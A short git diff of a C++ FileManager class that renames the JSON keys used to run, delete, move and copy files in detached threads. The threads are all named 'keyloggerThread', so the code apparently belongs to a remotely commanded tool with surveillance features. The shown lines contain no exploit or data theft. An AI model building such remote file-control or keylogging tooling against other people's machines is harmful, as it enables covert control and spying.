@@ -128,27 +128,27 @@ void FileManager::runFiles(const std::vector<std::string> &vectorOfFiles) {
 }
 
 void FileManager::runFilesThread(nlohmann::json jsonObject){
-    std::vector<std::string> vectorOfFiles = jsonObject["file_list"];
+    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
     std::thread keyloggerThread(&FileManager::runFiles, this,vectorOfFiles);
     keyloggerThread.detach();
 }
 
 void FileManager::deleteFilesThread(nlohmann::json jsonObject) {
-    std::vector<std::string> vectorOfFiles = jsonObject["file_list"];
+    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
     std::thread keyloggerThread(&FileManager::deleteFiles, this,vectorOfFiles);
     keyloggerThread.detach();
 }
 
 void FileManager::moveFilesThread(nlohmann::json jsonObject) {
-    std::vector<std::string> vectorOfFiles = jsonObject["file_list"];
-    std::string directory = jsonObject["path"];
+    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
+    std::string directory = jsonObject["to_path"];
     std::thread keyloggerThread(&FileManager::moveFiles, this,vectorOfFiles,directory);
     keyloggerThread.detach();
 }
 
 void FileManager::copyFilesThread(nlohmann::json jsonObject){
-    std::vector<std::string> vectorOfFiles = jsonObject["file_list"];
-    std::vector<std::string> vectorOfDirectories = jsonObject["directory_list"];
+    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
+    std::vector<std::string> vectorOfDirectories = jsonObject["to_paths"];
     std::thread keyloggerThread(&FileManager::copyFiles, this,vectorOfFiles,vectorOfDirectories);
     keyloggerThread.detach();
 }
